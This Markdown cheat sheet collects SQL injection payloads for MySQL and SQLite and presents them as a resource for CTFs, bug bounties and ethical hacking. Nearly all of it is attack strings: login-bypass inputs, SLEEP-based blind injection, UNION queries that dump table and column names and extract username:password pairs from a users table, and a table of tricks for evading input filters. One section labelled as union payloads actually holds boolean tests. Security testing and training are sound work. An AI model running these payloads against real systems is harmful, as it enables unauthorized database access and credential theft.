# 💉 SQL Injection Shortcut Commands Cheat Sheet

This cheat sheet provides commonly used SQL Injection (SQLi) payloads for both **MySQL** and **SQLite**. Perfect for CTFs, bug bounties, and ethical hacking.

---

## 📌 Table of Contents

- [💉 SQL Injection Shortcut Commands Cheat Sheet](#-sql-injection-shortcut-commands-cheat-sheet)
	- [📌 Table of Contents](#-table-of-contents)
		- [🔓 Basic](#-basic)
		- [🔍 Union-Based Injection](#-union-based-injection)
		- [⏱️ Time-Based Blind Injection](#️-time-based-blind-injection)
		- [📤 Data Extraction](#-data-extraction)
	- [🛠 Filter Bypass Tricks](#-filter-bypass-tricks)
	- [📚 Useful Functions](#-useful-functions)

---

### 🔓 Basic

**MySQL**

```sql
' OR '1'='1' --
' OR 1=1 --
' OR '1'='1' /*
admin' --
admin' #
' OR ''='
```

**SQLite**

```sql
' OR 1=1--
' OR 1 GLOB 1--
' OR 1 LIKE 1--
```

---

### 🔍 Union-Based Injection

**MySQL Union Payloads**

```sql
' OR 1=1--
' AND 1=1--
' AND 1=2--
```

**SQLite Union Payloads**

```sql
' UNION SELECT sqlite_version(), null--
' UNION SELECT name, sql FROM sqlite_master WHERE type='table'--
```

---

### ⏱️ Time-Based Blind Injection

**MySQL**

```sql
' OR IF(1=1, SLEEP(5), 0)--
' OR SLEEP(5)--
```

---

### 📤 Data Extraction

**MySQL**

```sql
' UNION SELECT 1, group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()--
' UNION SELECT 1, group_concat(column_name) FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT 1, concat(username, ':', password) FROM users--
```

---

## 🛠 Filter Bypass Tricks

| Filtered | Bypass Example          |
| -------- | ----------------------- |
| or       | oR, o/\*\*/r, `         |
| and      | aNd, a/\*\*/Nd, &&      |
| =        | LIKE, GLOB, IN          |
| '        | " or %27 (URL encoding) |
| --       | #, --+, /\* \*/         |

---

## 📚 Useful Functions

| DBMS   | Functions / Keywords                   |
| ------ | -------------------------------------- |
| MySQL  | @@version, DATABASE(), USER(), SLEEP() |
| SQLite | sqlite_version(), sqlite_master, GLOB  |

---
